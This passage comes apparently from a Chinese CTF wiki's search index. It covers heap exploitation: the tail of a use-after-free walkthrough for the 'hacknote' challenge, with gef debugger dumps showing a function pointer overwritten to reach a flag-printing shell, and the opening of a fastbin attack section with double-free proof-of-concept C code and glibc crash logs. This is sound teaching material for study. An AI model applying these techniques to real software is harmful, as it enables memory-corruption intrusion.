\u7533\u8bf7note2\u5bf9\u5e94\u7684\u5185\u5b58\u5757\u4e3a0x804b040\uff0c\u5176\u5b9e\u5c31\u662fnote1\u5bf9\u5e94\u7684\u5185\u5b58\u5730\u5740\u3002  [+]   Heap-Analysis   -   malloc ( 8 ) = 0x804b040  [+]   Heap-Analysis   -   malloc ( 8 ) = 0x804b040  0 x080486cf   in   add_note   ()  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   registers   ] \u2500\u2500\u2500\u2500  $eax     :   0x0804b040    \u2192    0x0804b000    \u2192    0x00000000  $ebx     :   0x00000000  $ecx     :   0xf7fac780    \u2192    0x00000000  $edx     :   0x0804b040    \u2192    0x0804b000    \u2192    0x00000000  $esp     :   0xffffcf10    \u2192    0x00000008  $ebp     :   0xffffcf48    \u2192    0xffffcf68    \u2192    0x00000000  $esi     :   0xf7fac000    \u2192    0x001b1db0  $edi     :   0xf7fac000    \u2192    0x001b1db0  $eip     :   0x080486cf    \u2192    add_note + 89   add   esp ,   0x10  $cs      :   0x00000023  $ss      :   0x0000002b  $ds      :   0x0000002b  $es      :   0x0000002b  $fs      :   0x00000000  $gs      :   0x00000063  $eflags:   [ carry   PARITY   adjust   ZERO   sign   trap   INTERRUPT   direction   overflow   resume   virtualx86   identification ]  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   code: i386   ] \u2500\u2500\u2500\u2500 \n     0 x80486c2   add_note + 76      add      DWORD   PTR   [ eax ],   eax \n     0 x80486c4   add_note + 78      add      BYTE   PTR   [ ebx + 0x86a0cec ],   al \n     0 x80486ca   add_note + 84      call     0x80484e0   malloc@plt \n  \u2192    0 x80486cf   add_note + 89      add      esp ,   0x10   \u7533\u8bf7note2\u7684content\u7684\u5185\u5b58\u5730\u5740\u4e3a0x804b008\uff0c\u5c31\u662fnote0\u5bf9\u5e94\u7684\u5730\u5740\uff0c\u5373\u6b64\u65f6\u6211\u4eec\u5411note2\u7684content\u5199\u5185\u5bb9\uff0c\u5c31\u4f1a\u5c06note0\u7684put\u5b57\u6bb5\u8986\u76d6\u3002  gef \u27a4    n   1  [+]   Heap-Analysis   -   malloc ( 8 ) = 0x804b008  [+]   Heap-Analysis   -   malloc ( 8 ) = 0x804b008  0 x08048761   in   add_note   ()  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   registers   ] \u2500\u2500\u2500\u2500  $eax     :   0x0804b008    \u2192    0x00000000  $ebx     :   0x0804b040    \u2192    0x0804865b    \u2192    print_note_content + 0   push   ebp  $ecx     :   0xf7fac780    \u2192    0x00000000  $edx     :   0x0804b008    \u2192    0x00000000  $esp     :   0xffffcf10    \u2192    0x00000008  $ebp     :   0xffffcf48    \u2192    0xffffcf68    \u2192    0x00000000  $esi     :   0xf7fac000    \u2192    0x001b1db0  $edi     :   0xf7fac000    \u2192    0x001b1db0  $eip     :   0x08048761    \u2192    add_note + 235   add   esp ,   0x10  $cs      :   0x00000023  $ss      :   0x0000002b  $ds      :   0x0000002b  $es      :   0x0000002b  $fs      :   0x00000000  $gs      :   0x00000063  $eflags:   [ carry   PARITY   adjust   ZERO   sign   trap   INTERRUPT   direction   overflow   resume   virtualx86   identification ]  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   code: i386   ] \u2500\u2500\u2500\u2500 \n     0 x8048752   add_note + 220     mov      al ,   ds : 0x458b0804 \n     0 x8048757   add_note + 225     call     0x581173df \n     0 x804875c   add_note + 230     call     0x80484e0   malloc@plt \n  \u2192    0 x8048761   add_note + 235     add      esp ,   0x10   \u6211\u4eec\u6765\u5177\u4f53\u68c0\u9a8c\u4e00\u4e0b\uff0c\u770b\u4e00\u4e0b\u8986\u76d6\u524d\u7684\u60c5\u51b5\uff0c\u53ef\u4ee5\u770b\u5230\u8be5\u5185\u5b58\u5757\u7684put\u6307\u9488\u5df2\u7ecf\u88ab\u7f6e\u4e3aNULL\u4e86\uff0c\u8fd9\u662f\u7531fastbin\u7684free\u673a\u5236\u51b3\u5b9a\u7684\u3002  gef \u27a4    x / 2 xw   0x804b008  0 x804b008:    0 x00000000    0x0804b018   \u8986\u76d6\u540e\uff0c\u5177\u4f53\u7684\u503c\u5982\u4e0b  gef \u27a4    x / 2 xw   0x804b008  0 x804b008:    0 x08048986    0x0804b00a  gef \u27a4    x / i   0x08048986 \n    0 x8048986   magic :     push     ebp   \u53ef\u4ee5\u770b\u51fa\uff0c\u786e\u5b9e\u5df2\u7ecf\u88ab\u8986\u76d6\u4e3a\u6211\u4eec\u6240\u60f3\u8981\u7684magic\u51fd\u6570\u4e86\u3002  \u6700\u540e\u6267\u884c\u7684\u6548\u679c\u5982\u4e0b  [ + ]  Starting  local  process  ./hacknote : pid  35030  [ * ]  Switching to interactive mode\nflag { use_after_free } ----------------------\n       HackNote       \n----------------------\n  1 . Add note          \n  2 . Delete note       \n  3 . Print note        \n  4 . Exit              \n----------------------  \u540c\u65f6\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u501f\u52a9gef\u7684heap-analysis-helper \u6765\u770b\u4e00\u4e0b\u6574\u4f53\u7684\u5806\u7684\u7533\u8bf7\u4e0e\u91ca\u653e\u7684\u60c5\u51b5\uff0c\u5982\u4e0b  gef \u27a4    heap-analysis-helper   [*]   This   feature   is   under   development ,   expect   bugs   and   unstability...  [+]   Tracking   malloc ()  [+]   Tracking   free ()  [+]   Tracking   realloc ()  [+]   Disabling   hardware   watchpoints   ( this   may   increase   the   latency )  [+]   Dynamic   breakpoints   correctly   setup ,   GEF   will   break   execution   if   a   possible   vulnerabity   is   found.  [*]   Note:   The   heap   analysis   slows   down   noticeably   the   execution.   gef \u27a4    c  Continuing.  [+]   Heap-Analysis   -   malloc ( 8 ) = 0x804b008  [+]   Heap-Analysis   -   malloc ( 8 ) = 0x804b008  [+]   Heap-Analysis   -   malloc ( 32 ) = 0x804b018  [+]   Heap-Analysis   -   malloc ( 8 ) = 0x804b040  [+]   Heap-Analysis   -   malloc ( 32 ) = 0x804b050  [+]   Heap-Analysis   -   free ( 0x804b018 )  [+]   Heap-Analysis   -   watching   0x804b018  [+]   Heap-Analysis   -   free ( 0x804b008 )  [+]   Heap-Analysis   -   watching   0x804b008  [+]   Heap-Analysis   -   free ( 0x804b050 )  [+]   Heap-Analysis   -   watching   0x804b050  [+]   Heap-Analysis   -   free ( 0x804b040 )  [+]   Heap-Analysis   -   watching   0x804b040  [+]   Heap-Analysis   -   malloc ( 8 ) = 0x804b040  [+]   Heap-Analysis   -   malloc ( 8 ) = 0x804b008  [+]   Heap-Analysis   -   Cleaning   up  [+]   Heap-Analysis   -   Re-enabling   hardware   watchpoints  [ New   process   36248 ]  process   36248   is   executing   new   program :   / bin / dash  [ New   process   36249 ]  process   36249   is   executing   new   program :   / bin / cat  [ Inferior   3   ( process   36249 )   exited   normally ]   \u8fd9\u91cc\u7b2c\u4e00\u4e2a\u8f93\u51fa\u4e86\u4e24\u6b21\uff0c\u5e94\u8be5\u662fgef\u5de5\u5177\u7684\u95ee\u9898\u3002", 
            "title": "\u5229\u7528\u811a\u672c"
        }, 
        {
            "location": "/pwn/heap/use_after_free/#_6", 
            "text": "2016 HCTF fheap", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/", 
            "text": "Fastbin Attack\n\n\n\u4ecb\u7ecd\n\n\nfastbin attack \u662f\u4e00\u7c7b\u6f0f\u6d1e\u7684\u5229\u7528\u65b9\u6cd5\uff0c\u662f\u6307\u6240\u6709\u57fa\u4e8e fastbin \u673a\u5236\u7684\u6f0f\u6d1e\u5229\u7528\u65b9\u6cd5\u3002\u8fd9\u7c7b\u5229\u7528\u7684\u524d\u63d0\u662f\uff1a\n\n\n\n\n\u5b58\u5728\u5806\u6ea2\u51fa\u3001use-after-free \u7b49\u80fd\u63a7\u5236 chunk \u5185\u5bb9\u7684\u6f0f\u6d1e\n\n\n\u6f0f\u6d1e\u53d1\u751f\u4e8e fastbin \u7c7b\u578b\u7684 chunk \u4e2d\n\n\n\n\n\u5982\u679c\u7ec6\u5206\u7684\u8bdd\uff0c\u53ef\u4ee5\u505a\u5982\u4e0b\u7684\u5206\u7c7b\uff1a\n\n\n\n\nFastbin Double Free\n\n\nHouse of Spirit\n\n\nAlloc to Stack\n\n\nArbitrary Alloc\n\n\n\n\n\u5176\u4e2d\uff0c\u524d\u4e24\u79cd\u4e3b\u8981\u6f0f\u6d1e\u4fa7\u91cd\u4e8e\u5229\u7528 \nfree\n \u51fd\u6570\u91ca\u653e\n\u771f\u7684 chunk \u6216\u4f2a\u9020\u7684 chunk\n\uff0c\u7136\u540e\u518d\u6b21\u7533\u8bf7 chunk \u8fdb\u884c\u653b\u51fb\uff0c\u540e\u4e24\u79cd\u4fa7\u91cd\u4e8e\u6545\u610f\u4fee\u6539 \nfd\n \u6307\u9488\uff0c\u76f4\u63a5\u5229\u7528 \nmalloc\n \u7533\u8bf7\u6307\u5b9a\u4f4d\u7f6e chunk \u8fdb\u884c\u653b\u51fb\u3002\n\n\n\u539f\u7406\n\n\nfastbin attack \u5b58\u5728\u7684\u539f\u56e0\u5728\u4e8e fastbin \u662f\u4f7f\u7528\u5355\u94fe\u8868\u6765\u7ef4\u62a4\u91ca\u653e\u7684\u5806\u5757\u7684\uff0c\u5e76\u4e14\u7531 fastbin \u7ba1\u7406\u7684 chunk \u5373\u4f7f\u88ab\u91ca\u653e\uff0c\u5176 next_chunk \u7684 prev_inuse \u4f4d\u4e5f\u4e0d\u4f1a\u88ab\u6e05\u7a7a\u3002\n\u6211\u4eec\u6765\u770b\u4e00\u4e0b fastbin \u662f\u600e\u6837\u7ba1\u7406\u7a7a\u95f2 chunk \u7684\u3002\n\nint main(void)\n{\n    void *chunk1,*chunk2,*chunk3;\n    chunk1=malloc(0x30);\n    chunk2=malloc(0x30);\n    chunk3=malloc(0x30);\n    //\u8fdb\u884c\u91ca\u653e\n    free(chunk1);\n    free(chunk2);\n    free(chunk3);\n    return 0;\n}\n\n\n\u91ca\u653e\u524d\n\n0x602000:   0x0000000000000000  0x0000000000000041 \n=== chunk1\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000000\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000041 \n=== chunk2\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000041 \n=== chunk3\n0x602090:   0x0000000000000000  0x0000000000000000\n0x6020a0:   0x0000000000000000  0x0000000000000000\n0x6020b0:   0x0000000000000000  0x0000000000000000\n0x6020c0:   0x0000000000000000  0x0000000000020f41 \n=== top chunk\n\n\n\u6267\u884c\u4e09\u6b21 free \u8fdb\u884c\u91ca\u653e\u540e\n\n0x602000:   0x0000000000000000  0x0000000000000041 \n=== chunk1\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000000\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000041 \n=== chunk2\n0x602050:   0x0000000000602000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000041 \n=== chunk3\n0x602090:   0x0000000000602040  0x0000000000000000\n0x6020a0:   0x0000000000000000  0x0000000000000000\n0x6020b0:   0x0000000000000000  0x0000000000000000\n0x6020c0:   0x0000000000000000  0x0000000000020f41 \n=== top chunk\n\n\n\u6b64\u65f6\u4f4d\u4e8e main_arena \u4e2d\u7684 fastbin \u94fe\u8868\u4e2d\u5df2\u7ecf\u50a8\u5b58\u4e86\u6307\u5411 chunk3 \u7684\u6307\u9488\uff0c\u5e76\u4e14 chunk 3\u30012\u30011\u6784\u6210\u4e86\u4e00\u4e2a\u5355\u94fe\u8868\n\nFastbins[idx=2, size=0x30,ptr=0x602080]\n===\nChunk(fd=0x602040, size=0x40, flags=PREV_INUSE)\n===\nChunk(fd=0x602000, size=0x40, flags=PREV_INUSE)\n===\nChunk(fd=0x000000, size=0x40, flags=PREV_INUSE) \n\n\n\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u7684\u56fe\u7247\u6765\u8868\u793a\u8fd9\u4e00\u70b9\n\n\n\nFastbin Double Free\n\n\n\u4ecb\u7ecd\n\n\nFastbin Double Free \u662f\u6307 fastbin \u7684 chunk \u53ef\u4ee5\u88ab\u591a\u6b21\u91ca\u653e\uff0c\u56e0\u6b64\u53ef\u4ee5\u5728 fastbin \u94fe\u8868\u4e2d\u5b58\u5728\u591a\u6b21\u3002\u8fd9\u6837\u5bfc\u81f4\u7684\u540e\u679c\u662f\u591a\u6b21\u5206\u914d\u53ef\u4ee5\u4ece fastbin \u94fe\u8868\u4e2d\u53d6\u51fa\u540c\u4e00\u4e2a\u5806\u5757\uff0c\u76f8\u5f53\u4e8e\u591a\u4e2a\u6307\u9488\u6307\u5411\u540c\u4e00\u4e2a\u5806\u5757\uff0c\u7ed3\u5408\u5806\u5757\u7684\u6570\u636e\u5185\u5bb9\u53ef\u4ee5\u5b9e\u73b0\u7c7b\u4f3c\u4e8e\u7c7b\u578b\u6df7\u6dc6(type confused)\u7684\u6548\u679c\u3002\n\n\nFastbin Double Free \u80fd\u591f\u6210\u529f\u5229\u7528\u4e3b\u8981\u6709\u4e24\u90e8\u5206\u7684\u539f\u56e0\n\n\n\n\nfastbin \u7684\u5806\u5757\u88ab\u91ca\u653e\u540e next_chunk \u7684 pre_inuse \u4f4d\u4e0d\u4f1a\u88ab\u6e05\u7a7a\n\n\nfastbin \u5728\u6267\u884c free \u7684\u65f6\u5019\u4ec5\u9a8c\u8bc1\u4e86 main_arena \u76f4\u63a5\u6307\u5411\u7684\u5757\uff0c\u5373\u94fe\u8868\u6307\u9488\u5934\u90e8\u7684\u5757\u3002\u5bf9\u4e8e\u94fe\u8868\u540e\u9762\u7684\u5757\uff0c\u5e76\u6ca1\u6709\u8fdb\u884c\u9a8c\u8bc1\u3002\n\n\n\n\n/* Another simple check: make sure the top of the bin is not the\n       record we are going to add (i.e., double free).  */\n    if (__builtin_expect (old == p, 0))\n      {\n        errstr = \ndouble free or corruption (fasttop)\n;\n        goto errout;\n}\n\n\n\n\n\u6f14\u793a\n\n\n\u4e0b\u9762\u7684\u793a\u4f8b\u7a0b\u5e8f\u8bf4\u660e\u4e86\u8fd9\u4e00\u70b9\uff0c\u5f53\u6211\u4eec\u8bd5\u56fe\u6267\u884c\u4ee5\u4e0b\u4ee3\u7801\u65f6\n\n\nint main(void)\n{\n    void *chunk1,*chunk2,*chunk3;\n    chunk1=malloc(0x10);\n    chunk2=malloc(0x10);\n\n    free(chunk1);\n    free(chunk1);\n    return 0;\n}\n\n\n\u5982\u679c\u4f60\u6267\u884c\u8fd9\u4e2a\u7a0b\u5e8f\uff0c\u4e0d\u51fa\u610f\u5916\u7684\u8bdd\u4f1a\u5f97\u5230\u5982\u4e0b\u7684\u7ed3\u679c\uff0c\u8fd9\u6b63\u662f _int_free \u51fd\u6570\u68c0\u6d4b\u5230\u4e86 fastbin \u7684 double free\u3002\n\n*** Error in `./tst\n: double free or corruption (fasttop): 0x0000000002200010 ***\n======= Backtrace: =========\n/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7fbb7a36c7e5]\n/lib/x86_64-linux-gnu/libc.so.6(+0x8037a)[0x7fbb7a37537a]\n/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7fbb7a37953c]\n./tst[0x4005a2]\n/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7fbb7a315830]\n./tst[0x400499]\n======= Memory map: ========\n00400000-00401000 r-xp 00000000 08:01 1052570                            /home/Ox9A82/tst/tst\n00600000-00601000 r--p 00000000 08:01 1052570                            /home/Ox9A82/tst/tst\n00601000-00602000 rw-p 00001000 08:01 1052570                            /home/Ox9A82/tst/tst\n02200000-02221000 rw-p 00000000 00:00 0                                  [heap]\n7fbb74000000-7fbb74021000 rw-p 00000000 00:00 0 \n7fbb74021000-7fbb78000000 ---p 00000000 00:00 0 \n7fbb7a0df000-7fbb7a0f5000 r-xp 00000000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1\n7fbb7a0f5000-7fbb7a2f4000 ---p 00016000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1\n7fbb7a2f4000-7fbb7a2f5000 rw-p 00015000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1\n7fbb7a2f5000-7fbb7a4b5000 r-xp 00000000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so\n7fbb7a4b5000-7fbb7a6b5000 ---p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so\n7fbb7a6b5000-7fbb7a6b9000 r--p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so\n7fbb7a6b9000-7fbb7a6bb000 rw-p 001c4000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so\n7fbb7a6bb000-7fbb7a6bf000 rw-p 00000000 00:00 0 \n7fbb7a6bf000-7fbb7a6e5000 r-xp 00000000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so\n7fbb7a8c7000-7fbb7a8ca000 rw-p 00000000 00:00 0 \n7fbb7a8e1000-7fbb7a8e4000 rw-p 00000000 00:00 0 \n7fbb7a8e4000-7fbb7a8e5000 r--p 00025000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so\n7fbb7a8e5000-7fbb7a8e6000 rw-p 00026000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so\n7fbb7a8e6000-7fbb7a8e7000 rw-p 00000000 00:00 0 \n7ffcd2f93000-7ffcd2fb4000 rw-p 00000000 00:00 0                          [stack]\n7ffcd2fc8000-7ffcd2fca000 r--p 00000000 00:00 0                          [vvar]\n7ffcd2fca000-7ffcd2fcc000 r-xp 00000000 00:00 0                          [vdso]\nffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]\n\u5df2\u653e\u5f03 (\u6838\u5fc3\u5df2\u8f6c\u50a8)\n\n\n\u5982\u679c\u6211\u4eec\u5728 chunk1 \u91ca\u653e\u540e\uff0c\u518d\u91ca\u653e chunk2 \uff0c\u8fd9\u6837 main_arena \u5c31\u6307\u5411 chunk2 \u800c\u4e0d\u662f chunk1 \u4e86\uff0c\u6b64\u65f6\u6211\u4eec\u518d\u53bb\u91ca\u653e chunk1 \u5c31\u4e0d\u518d\u4f1a\u88ab\u68c0\u6d4b\u5230\u3002\n\nint main(void)\n{\n    void *chunk1,*chunk2,*chunk3;\n    chunk1=malloc(0x10);\n    chunk2=malloc(0x10);\n\n    free(chunk1);\n    free(chunk2);\n    free(chunk1);\n    return 0;\n}\n\n\n\u7b2c\u4e00\u6b21\u91ca\u653e\nfree(chunk1)\n\n\n\n\n\u7b2c\u4e8c\u6b21\u91ca\u653e\nfree(chunk2)\n\n\n\n\n\u7b2c\u4e09\u6b21\u91ca\u653e\nfree(chunk1)\n\n\n\n\n\u6ce8\u610f\u56e0\u4e3a chunk1 \u88ab\u518d\u6b21\u91ca\u653e\u56e0\u6b64\u5176 fd \u503c\u4e0d\u518d\u4e3a 0 \u800c\u662f\u6307\u5411 chunk2\uff0c\u8fd9\u65f6\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236 chunk1 \u7684\u5185\u5bb9\uff0c\u4fbf\u53ef\u4ee5\u5199\u5165\u5176 fd \u6307\u9488\u4ece\u800c\u5b9e\u73b0\u5728\u6211\u4eec\u60f3\u8981\u7684\u4efb\u610f\u5730\u5740\u5206\u914d fastbin \u5757\u3002\n\u4e0b\u9762\u8fd9\u4e2a\u793a\u4f8b\u6f14\u793a\u4e86\u8fd9\u4e00\u70b9\uff0c\u9996\u5148\u8ddf\u524d\u9762\u4e00\u6837\u6784\u9020 main_arena=\nchunk1=\nchun2=\nchunk1\u7684\u94fe\u8868\u3002\u4e4b\u540e\u7b2c\u4e00\u6b21\u8c03\u7528 malloc \u8fd4\u56de chunk1 \u4e4b\u540e\u4fee\u6539 chunk1 \u7684 fd \u6307\u9488\u6307\u5411 bss \u6bb5\u4e0a\u7684 bss_chunk\uff0c\u4e4b\u540e\u6211\u4eec\u53ef\u4ee5\u770b\u5230 fastbin \u4f1a\u628a\u5806\u5757\u5206\u914d\u5230\u8fd9\u91cc\u3002\n\n\ntypedef struct _chunk\n{\n    long long pre_size;\n    long long size;\n    long long fd;\n    long long bk;  \n} CHUNK,*PCHUNK;\n\nCHUNK bss_chunk;\n\nint main(void)\n{\n    void *chunk1,*chunk2,*chunk3;\n    void *chunk_a,*chunk_b;\n\n    bss_chunk.size=0x21;\n    chunk1=malloc(0x10);\n    chunk2=malloc(0x10);\n\n    free(chunk1);\n    free(chunk2);\n    free(chunk1);\n\n    chunk_a=malloc(0x10);\n    *(long long *)chunk_a=\nbss_chunk;\n    malloc(0x10);\n    malloc(0x10);\n    chunk_b=malloc(0x10);\n    printf(\n%p\n,chunk_b);\n    return 0;\n}\n\n\n\u5728\u6211\u7684\u7cfb\u7edf\u4e0a chunk_b \u8f93\u51fa\u7684\u503c\u4f1a\u662f 0x601090\uff0c\u8fd9\u4e2a\u503c\u4f4d\u4e8ebss\u6bb5\u4e2d\u6b63\u662f\u6211\u4eec\u4e4b\u524d\u8bbe\u7f6e\u7684\nCHUNK bss_chunk\n\n\nStart              End                Offset             Perm Path\n0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/Ox9A82/tst/tst\n0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/Ox9A82/tst/tst\n0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/Ox9A82/tst/tst\n0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]\n\n0x601080 \nbss_chunk\n:   0x0000000000000000  0x0000000000000021\n0x601090 \nbss_chunk+16\n:0x0000000000000000  0x0000000000000000\n0x6010a0:               0x0000000000000000  0x0000000000000000\n0x6010b0:               0x0000000000000000  0x0000000000000000\n0x6010c0:               0x0000000000000000  0x0000000000000000\n\n\n\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u5728 main \u51fd\u6570\u7684\u7b2c\u4e00\u6b65\u5c31\u8fdb\u884c\u4e86\nbss_chunk.size=0x21;\n\u7684\u64cd\u4f5c\uff0c\u8fd9\u662f\u56e0\u4e3a_int_malloc\u4f1a\u5bf9\u6b32\u5206\u914d\u4f4d\u7f6e\u7684 size \u57df\u8fdb\u884c\u9a8c\u8bc1\uff0c\u5982\u679c\u5176 size \u4e0e\u5f53\u524d fastbin \u94fe\u8868\u5e94\u6709 size \u4e0d\u7b26\u5c31\u4f1a\u629b\u51fa\u5f02\u5e38\u3002\n\n*** Error in `./tst\n: malloc(): memory corruption (fast): 0x0000000000601090 ***\n======= Backtrace: =========\n/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f8f9deb27e5]\n/lib/x86_64-linux-gnu/libc.so.6(+0x82651)[0x7f8f9debd651]\n/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7f8f9debf184]\n./tst[0x400636]\n/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f8f9de5b830]\n./tst[0x4004e9]\n======= Memory map: ========\n00400000-00401000 r-xp 00000000 08:01 1052570                            /home/Ox9A82/tst/tst\n00600000-00601000 r--p 00000000 08:01 1052570                            /home/Ox9A82/tst/tst\n00601000-00602000 rw-p 00001000 08:01 1052570                            /home/Ox9A82/tst/tst\n00bc4000-00be5000 rw-p 00000000 00:00 0                                  [heap]\n7f8f98000000-7f8f98021000 rw-p 00000000 00:00 0 \n7f8f98021000-7f8f9c000000 ---p 00000000 00:00 0 \n7f8f9dc25000-7f8f9dc3b000 r-xp 00000000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1\n7f8f9dc3b000-7f8f9de3a000 ---p 00016000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1\n7f8f9de3a000-7f8f9de3b000 rw-p 00015000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1\n7f8f9de3b000-7f8f9dffb000 r-xp 00000000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so\n7f8f9dffb000-7f8f9e1fb000 ---p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so\n7f8f9e1fb000-7f8f9e1ff000 r--p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so\n7f8f9e1ff000-7f8f9e201000 rw-p 001c4000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so\n7f8f9e201000-7f8f9e205000 rw-p 00000000 00:00 0 \n7f8f9e205000-7f8f9e22b000 r-xp 00000000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so\n7f8f9e40d000-7f8f9e410000 rw-p 00000000 00:00 0 \n7f8f9e427000-7f8f9e42a000 rw-p 00000000 00:00 0 \n7f8f9e42a000-7f8f9e42b000 r--p 00025000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so\n7f8f9e42b000-7f8f9e42c000 rw-p 00026000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so\n7f8f9e42c000-7f8f9e42d000 rw-p 00000000 00:00 0 \n7fff71a94000-7fff71ab5000 rw-p 00000000 00:00 0                          [stack]\n7fff71bd9000-7fff71bdb000 r--p 00000000 00:00 0                          [vvar]\n7fff71bdb000-7fff71bdd000 r-xp 00000000 